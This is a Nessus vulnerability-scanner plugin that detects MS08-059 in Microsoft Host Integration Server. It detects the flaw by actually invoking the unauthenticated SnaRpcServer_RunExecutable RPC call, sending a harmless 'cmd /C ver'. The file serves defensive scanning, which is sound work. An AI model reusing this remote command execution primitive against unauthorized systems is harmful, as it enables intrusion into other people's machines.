#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(34412);
 script_version("$Revision: 1.8 $");

 script_cve_id("CVE-2008-3466");
 script_bugtraq_id(31620);
 script_xref(name:"OSVDB", value:"49068");

 script_name(english:"MS08-059: Microsoft Host Integration Server (HIS) SNA RPC Request Remote Overflow (956695) (uncredentialed check)");
 script_summary(english:"Determines the presence of update 956695");

 script_set_attribute(
  attribute:"synopsis",
  value:string(
   "Arbitrary code can be executed on the remote host through Host\n",
   "Integration Server (HIS)."
  )
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "The remote host has HIS (Host Integration Server) installed.  The\n",
   "remote version of this product is affected by a code execution\n",
   "vulnerability in its RPC interface. \n",
   "\n",
   "An attacker could exploit this flaw to execute arbitrary code on the\n",
   "remote host by making rogue RPC queries."
  )
 );
 script_set_attribute(
  attribute:"solution", 
  value:string(
   "Microsoft has released a set of patches for HIS 2000, 2003 and 2006 :\n",
   "\n",
   "http://www.microsoft.com/technet/security/Bulletin/MS08-059.mspx"
  )
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 script_family(english:"Windows");
 script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");
 script_dependencies("dcetest.nasl");
 script_require_keys("Services/DCE/ed6ee250-e0d1-11cf-925a-00aa00c006c1");
 exit(0);
}

#

include ('smb_func.inc');

port = get_kb_item ("Services/DCE/ed6ee250-e0d1-11cf-925a-00aa00c006c1");
if (!port)
  exit (0);

if ( ! get_port_state(port) ) exit(0);
soc = open_sock_tcp (port);
if (!soc) exit (0);

ret = dce_rpc_bind(cid:session_get_cid(), uuid:"ed6ee250-e0d1-11cf-925a-00aa00c006c1", vers:1);
send (socket:soc, data:ret);
resp = recv (socket:soc, length:4096);

if (!resp)
{
 close (soc);
 exit (0); 
}

ret = dce_rpc_parse_bind_ack (data:resp);
if (isnull (ret) || (ret != 0))
{
 close (soc);
 exit (0);
}

session_set_unicode (unicode:0);

data =
       class_name (name:"cmd") +
       class_name (name:"/C ver");

# SnaRpcServer_RunExecutable
ret = dce_rpc_request (code:0x01, data:data);
send (socket:soc, data:ret);
resp = recv (socket:soc, length:4096);

resp = dce_rpc_parse_response (data:resp);
if (strlen(resp) == 1 && ord(resp[0]) != 0)
  security_hole(port);


